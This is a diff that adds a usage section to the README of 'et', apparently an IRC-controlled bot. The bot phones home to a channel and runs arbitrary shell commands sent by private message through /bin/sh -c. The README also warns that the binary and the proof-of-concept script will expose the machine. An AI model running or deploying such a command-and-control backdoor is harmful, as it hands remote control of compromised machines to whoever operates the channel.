@@ -19,6 +19,26 @@ Do not actually run the resulting `et` binary, as it *WILL* connect you to the d
 
 The Windows version is incomplete.
 
+### Usage
+Controlling the `et` bots from the IRC server is very simple.
+
+When each bot connects, it sends out a channel-wide message of the format:
+```
+et#######: et####### phoning home
+```
+
+From that point on, the bot is ready to receive commands. All commands are executed by `/bin/sh -c` expect for quit and info, which are defined to kill the bot and report `uname(3)` output respectively.
+
+Some examples, all from the IRC prompt:
+```
+et#######: et####### phoning home
+/msg et####### info
+/msg et####### pwd
+/msg et####### quit
+```
+
+Currently, output from system commands is limited to approximately 512 characters. 
+
 ### Proof of Concept
 The original PoC Python script can be found under `src/poc/et.py`. Like the actual version, it does work and *WILL* expose your machine.
 
